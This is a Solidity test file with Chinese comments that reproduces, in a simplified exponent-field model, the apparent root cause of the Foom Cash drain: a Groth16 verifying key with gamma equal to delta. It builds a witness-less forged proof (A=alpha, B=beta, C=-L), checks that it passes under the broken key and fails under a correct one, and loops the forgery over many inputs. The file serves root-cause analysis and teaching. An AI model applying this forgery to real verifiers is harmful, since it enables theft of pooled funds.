// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {MiniGroth16Verifier} from "../src/MiniGroth16Verifier.sol";

/*
 * ============================================================================
 *  Forgery.t.sol — Foom Cash 漏洞根因复现(最小化模型)
 * ============================================================================
 *  不 import forge-std,全部用 require 断言。
 *
 *  演示链条:
 *   1) 真证明(知道 witness)在 正确VK(gamma!=delta) 与 误配VK(gamma==delta) 下都通过
 *      —— 说明 verifier 本身能接受真证明,误配并未"碰巧拒真"。
 *   2) 伪造证明(无 witness:A=alpha, B=beta, C=-L)在 误配VK(gamma==delta) 下【通过】
 *      —— 校验退化为恒等式,这是 Foom Cash 被放空的直接原因。
 *   3) 同一份伪造证明在 正确VK(gamma!=delta) 下【被拒】
 *      —— soundness 依赖 gamma、delta 线性无关,正确设置下伪造失败。
 *
 *  注:这是"演示 verifier 退化原理的最小化模型,非真实 Groth16 配对"。
 *  详见 src/MiniGroth16Verifier.sol 顶部说明。
 */
contract ForgeryTest {
    uint256 internal constant BN254_R =
        21888242871839275222246405745257275088548364400416034343698204186575808495617;

    // 任意但固定的"可信设置秘密"(指数域),用于构造一份真证明做对照。
    // 真实里这些来自 toxic waste,prover 不知道 alpha/beta 的离散对数,
    // 但知道满足电路约束的 witness;本模型用指数关系等价表达。
    uint256 internal constant ALPHA = 11111111111111111111111;
    uint256 internal constant BETA  = 22222222222222222222222;

    // 公共输入(对应 root / nullifierHash / recipient 折叠出来的单个标量)。
    uint256 internal constant PUBLIC_INPUT = 0xDEADBEEF;

    // IC 线性组合系数(对应 vk 的 IC 点)。
    uint256 internal constant IC_BASE  = 7;
    uint256 internal constant IC_COEFF = 13;

    // ---- 误配 VK:gamma == delta(Phase 2 漏跑随机化,两者都停在 G2 生成元)----
    // 用同一个值表示二者皆等于"默认占位 G2 生成元"。
    uint256 internal constant G2_GENERATOR_PLACEHOLDER = 9;

    // ---- 正确 VK:gamma != delta(Phase 2 各自独立随机化)----
    uint256 internal constant GAMMA_OK = 1234567;
    uint256 internal constant DELTA_OK = 7654321;

    function setUp() public {}

    // 在指数域里 negate:返回 (r - (x mod r)) mod r,等价于群里的 -P。
    function neg(uint256 x) internal pure returns (uint256) {
        uint256 m = x % BN254_R;
        return m == 0 ? 0 : BN254_R - m;
    }

    // 构造一份"真证明":prover 用 witness w 满足等式。
    // 取 A = alpha, B = beta? 不行,那样就和伪造没区别——真证明必须依赖 witness 满足约束。
    // 做法:固定 B = beta;由等式 A*B == alpha*beta + L*gamma + C*delta 反解 A,
    // 其中 (C, w) 体现 witness。这保证真证明是【针对该 VK 算出来】的,
    // 因此换 VK(gamma/delta 不同)需要重新生成 —— 正符合真实情形。
    function makeRealProof(
        uint256 gamma,
        uint256 delta,
        uint256 publicInput,
        uint256 witnessC
    ) internal pure returns (uint256 A, uint256 B, uint256 C) {
        B = BETA;
        C = witnessC % BN254_R;

        // L = IC_BASE + IC_COEFF*publicInput
        uint256 L = addmod(IC_BASE, mulmod(IC_COEFF, publicInput % BN254_R, BN254_R), BN254_R);

        // rhs = alpha*beta + L*gamma + C*delta
        uint256 rhs = mulmod(ALPHA, BETA, BN254_R);
        rhs = addmod(rhs, mulmod(L, gamma, BN254_R), BN254_R);
        rhs = addmod(rhs, mulmod(C, delta, BN254_R), BN254_R);

        // A = rhs / B  (模逆),使 A*B == rhs
        A = mulmod(rhs, modinv(B, BN254_R), BN254_R);
    }

    function modinv(uint256 a, uint256 m) internal pure returns (uint256) {
        // 费马小定理:a^(m-2) mod m,m 为素数。
        return modexp(a % m, m - 2, m);
    }

    function modexp(uint256 base, uint256 exp, uint256 mod) internal pure returns (uint256 r) {
        r = 1;
        base = base % mod;
        while (exp > 0) {
            if (exp & 1 == 1) {
                r = mulmod(r, base, mod);
            }
            exp >>= 1;
            base = mulmod(base, base, mod);
        }
    }

    // ========================================================================
    //  测试 1:真证明在【正确 VK】下通过(基线:verifier 能接受真证明)
    // ========================================================================
    function test_RealProof_PassesUnderCorrectVK() public {
        MiniGroth16Verifier v = new MiniGroth16Verifier(
            ALPHA, BETA, GAMMA_OK, DELTA_OK, IC_BASE, IC_COEFF
        );
        (uint256 A, uint256 B, uint256 C) =
            makeRealProof(GAMMA_OK, DELTA_OK, PUBLIC_INPUT, 999);

        require(v.verify(A, B, C, PUBLIC_INPUT), "real proof must pass under correct VK");
    }

    // ========================================================================
    //  测试 2:真证明在【误配 VK gamma==delta】下也通过
    //          —— 证明误配并非"恰好拒真",verifier 仍接受为它生成的真证明。
    // ========================================================================
    function test_RealProof_PassesUnderBrokenVK() public {
        MiniGroth16Verifier v = new MiniGroth16Verifier(
            ALPHA, BETA, G2_GENERATOR_PLACEHOLDER, G2_GENERATOR_PLACEHOLDER, IC_BASE, IC_COEFF
        );
        require(v.gamma() == v.delta(), "precondition: broken VK has gamma==delta");

        (uint256 A, uint256 B, uint256 C) = makeRealProof(
            G2_GENERATOR_PLACEHOLDER, G2_GENERATOR_PLACEHOLDER, PUBLIC_INPUT, 999
        );
        require(v.verify(A, B, C, PUBLIC_INPUT), "real proof must pass under broken VK too");
    }

    // ========================================================================
    //  测试 3(核心):无 witness 的伪造证明在【误配 VK gamma==delta】下【通过】
    //          构造:A=alpha, B=beta, C = -L  (攻击者自选 publicInput 后纯代数算出)
    //          因 gamma==delta: L*gamma + C*delta = L*g + (-L)*g = 0
    //          => 等式退化为 alpha*beta == alpha*beta,即 "1=1"
    //          这就是 Foom Cash 奖池被无差别放空的直接机制。
    // ========================================================================
    function test_Forgery_PassesUnderBrokenVK() public {
        MiniGroth16Verifier v = new MiniGroth16Verifier(
            ALPHA, BETA, G2_GENERATOR_PLACEHOLDER, G2_GENERATOR_PLACEHOLDER, IC_BASE, IC_COEFF
        );
        require(v.gamma() == v.delta(), "precondition: gamma==delta (Phase2 randomization skipped)");

        // 攻击者:任选公共输入(任意 recipient / nullifier),无需任何 witness。
        uint256 attackerPublicInput = 0xC0FFEE; // 与真证明不同的、攻击者自选的输入
        uint256 L = v.computeL(attackerPublicInput);

        uint256 A = v.alpha();   // A = alpha
        uint256 B = v.beta();    // B = beta
        uint256 C = neg(L);      // C = -vk_x  —— 纯代数,凭空构造,无 witness

        // 这一笔伪造证明被 verifier 接受 => 资金可被提走。
        require(
            v.verify(A, B, C, attackerPublicInput),
            "FORGERY SHOULD PASS under broken VK (gamma==delta) but it did not"
        );
    }

    // ========================================================================
    //  测试 4(对照):同一伪造构造在【正确 VK gamma!=delta】下【被拒】
    //          L*gamma + C*delta = L*g + (-L)*d = L*(g-d) != 0
    //          => 等式不退化,伪造失败,soundness 成立。
    // ========================================================================
    function test_Forgery_RejectedUnderCorrectVK() public {
        MiniGroth16Verifier v = new MiniGroth16Verifier(
            ALPHA, BETA, GAMMA_OK, DELTA_OK, IC_BASE, IC_COEFF
        );
        require(v.gamma() != v.delta(), "precondition: gamma!=delta (Phase2 done correctly)");

        uint256 attackerPublicInput = 0xC0FFEE;
        uint256 L = v.computeL(attackerPublicInput);

        uint256 A = v.alpha();
        uint256 B = v.beta();
        uint256 C = neg(L); // 同样的伪造构造

        require(
            !v.verify(A, B, C, attackerPublicInput),
            "FORGERY MUST BE REJECTED under correct VK (gamma!=delta) but it passed"
        );
    }

    // ========================================================================
    //  测试 5:攻击者可对【任意多组公共输入】循环伪造(对应放空奖池的逐笔提款)
    //          —— 体现"递增 nullifier、换公共输入、回到第1步循环"的可重复性。
    // ========================================================================
    function test_Forgery_WorksForArbitraryInputs_Loop() public {
        MiniGroth16Verifier v = new MiniGroth16Verifier(
            ALPHA, BETA, G2_GENERATOR_PLACEHOLDER, G2_GENERATOR_PLACEHOLDER, IC_BASE, IC_COEFF
        );
        for (uint256 i = 1; i <= 30; i++) {
            uint256 pin = uint256(keccak256(abi.encode("nullifier", i)));
            uint256 L = v.computeL(pin);
            uint256 A = v.alpha();
            uint256 B = v.beta();
            uint256 C = neg(L);
            require(v.verify(A, B, C, pin), "loop forgery must pass for every input under broken VK");
        }
    }
}
